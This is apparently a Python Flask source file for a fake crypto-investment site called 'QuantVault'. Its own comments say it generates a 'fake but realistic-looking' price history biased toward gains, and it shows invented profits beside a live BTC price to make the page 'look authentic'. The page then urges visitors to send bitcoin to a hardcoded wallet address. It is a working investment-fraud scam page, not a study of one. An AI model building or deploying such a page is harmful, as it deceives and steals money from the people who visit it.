import datetime
import random
import requests
from flask import Flask, render_template_string, jsonify

app = Flask(__name__)

# YOUR WALLET ADDRESS
WALLET_ADDRESS = "bc1qlmclf05eq4fp870259t4qld7d5frugjhwa02ee"

# Configuration
# We simulate that the user "invested" 30 days ago
LOOKBACK_DAYS = 30

def get_live_btc_price():
    """Fetches real BTC price to make the graph look authentic."""
    try:
        # Free API, no key needed
        response = requests.get("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd")
        data = response.json()
        return data['bitcoin']['usd']
    except:
        return 65000 # Fallback price if API fails

def generate_simulated_history(current_price):
    """Generates a fake but realistic-looking history for the last 30 days."""
    data = []
    # Start with a random lower price to show growth
    base_price = current_price * random.uniform(0.65, 0.85) 
    
    for i in range(30):
        # Random daily volatility
        change = random.uniform(-0.05, 0.08) # -5% to +8% daily swing
        base_price = base_price * (1 + change)
        
        data.append({
            "date": (datetime.datetime.now() - datetime.timedelta(days=30-i)).strftime("%m/%d"),
            "price": round(base_price, 2)
        })
    return data

@app.route("/")
def index():
    current_price = get_live_btc_price()
    history = generate_simulated_history(current_price)
    
    # Calculate "Projected" value: If they sent 0.001 BTC 30 days ago, 
    # how much is it worth now based on our fake history?
    # We assume they sent a "standard" donation of 0.001 BTC for the math
    initial_donation_btc = 0.001 
    start_price_btc = history[0]['price'] / current_price # Reverse engineer starting BTC price
    
    # Current value of that hypothetical donation
    current_value = initial_donation_btc # We anchor it to their potential entry
    
    # Just for the graph, we simulate the *USD* value of a 0.001 BTC investment
    projected_usd = round(initial_donation_btc * history[-1]['price'], 2)
    initial_usd = round(initial_donation_btc * history[0]['price'], 2)
    profit_usd = projected_usd - initial_usd
    
    return render_template_string("""
    <!DOCTYPE html>
    <html>
    <head>
        <title>QuantVault | Institutional Yield</title>
        <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
        <style>
            body { background: #0b0c10; color: #c5c6c7; font-family: 'Courier New', monospace; margin: 0; padding: 0; }
            .top-bar { background: #1f2833; padding: 15px; display: flex; justify-content: space-between; border-bottom: 1px solid #45a29e; }
            .logo { font-size: 24px; font-weight: bold; color: #66fcf1; letter-spacing: 2px; }
            .status { color: #c5c6c7; font-size: 12px; }
            .container { max-width: 1000px; margin: 20px auto; padding: 20px; }
            .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
            .card { background: #1f2833; border: 1px solid #45a29e; border-radius: 4px; padding: 20px; position: relative; }
            .card h3 { margin-top: 0; color: #66fcf1; font-size: 14px; text-transform: uppercase; }
            .big-number { font-size: 32px; color: #fff; font-weight: bold; margin: 10px 0; }
            .profit { color: #00ff88; }
            .loss { color: #ff4949; }
            .address-box { background: #000; padding: 10px; border: 1px dashed #45a29e; font-size: 11px; word-break: break-all; margin-top: 10px; color: #888; }
            .btn { background: #66fcf1; color: #0b0c10; border: none; padding: 12px 24px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 15px; font-size: 16px; }
            .btn:hover { background: #fff; }
            .fine-print { margin-top: 30px; font-size: 10px; color: #555; text-align: center; border-top: 1px solid #333; padding-top: 10px; }
            canvas { background: #000; border: 1px solid #333; }
        </style>
    </head>
    <body>
        <div class="top-bar">
            <div class="logo">QUANTVAULT</div>
            <div class="status">LIVE MARKET FEED :: BTC/USD: ${{ price }}</div>
        </div>

        <div class="container">
            <div class="grid">
                <div class="card">
                    <h3>Simulation Entry (30 Days Ago)</h3>
                    <div class="big-number">${{ initial_usd }}</div>
                    <p style="font-size: 12px;">Hypothetical investment of 0.001 BTC</p>
                </div>
                <div class="card">
                    <h3>Current Value</h3>
                    <div class="big-number profit">${{ projected_usd }}</div>
                    <p class="profit">+{{ profit_usd|round(2) }} ({{ ((profit_usd/initial_usd)*100)|round(1) }}%)</p>
                </div>
            </div>

            <div class="card" style="margin-top: 20px;">
                <h3>Yield Chart (Simulated Market Beta)</h3>
                <canvas id="chart" height="150"></canvas>
            </div>

            <div class="card" style="margin-top: 20px;">
                <h3>Your Investment Wallet</h3>
                <p>Send BTC to the address below to join the simulation.</p>
                <div class="address-box">{{ wallet }}</div>
                <button class="btn" onclick="copyAddr()">COPY ADDRESS</button>
            </div>
        </div>

        <div class="fine-print">
            <strong>INSTITUTIONAL USE ONLY:</strong> Funds are held in cold storage reserve. 
            The yield shown is based on a "Market Beta" simulation relative to BTC/USD volatility. 
            This is not a guaranteed return product. Your contribution supports the QuantVault Protocol.
        </div>

        <script>
            function copyAddr() {
                navigator.clipboard.writeText("{{ wallet }}");
                alert("Address copied. Send BTC to initialize your simulation.");
            }

            const ctx = document.getElementById('chart').getContext('2d');
            const prices = [{{ history | map(attribute='price') | list | join(',') }}];
            const dates = [{{ history | map(attribute='date') | list | join(',') }}];

            new Chart(ctx, {
                type: 'line',
                data: {
                    labels: dates,
                    datasets: [{
                        label: 'BTC/USD',
                        data: prices,
                        borderColor: '#66fcf1',
                        backgroundColor: 'rgba(102, 252, 241, 0.1)',
                        fill: true,
                        tension: 0.3,
                        pointRadius: 0
                    }]
                },
                options: {
                    responsive: true,
                    plugins: { legend: { display: false } },
                    scales: {
                        x: { display: false },
                        y: { ticks: { color: '#555' }, grid: { color: '#222' } }
                    }
                }
            });
        </script>
    </body>
    </html>
    """, price=round(current_price, 2), projected_usd=projected_usd, initial_usd=initial_usd, profit_usd=profit_usd, wallet=WALLET_ADDRESS, history=history)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
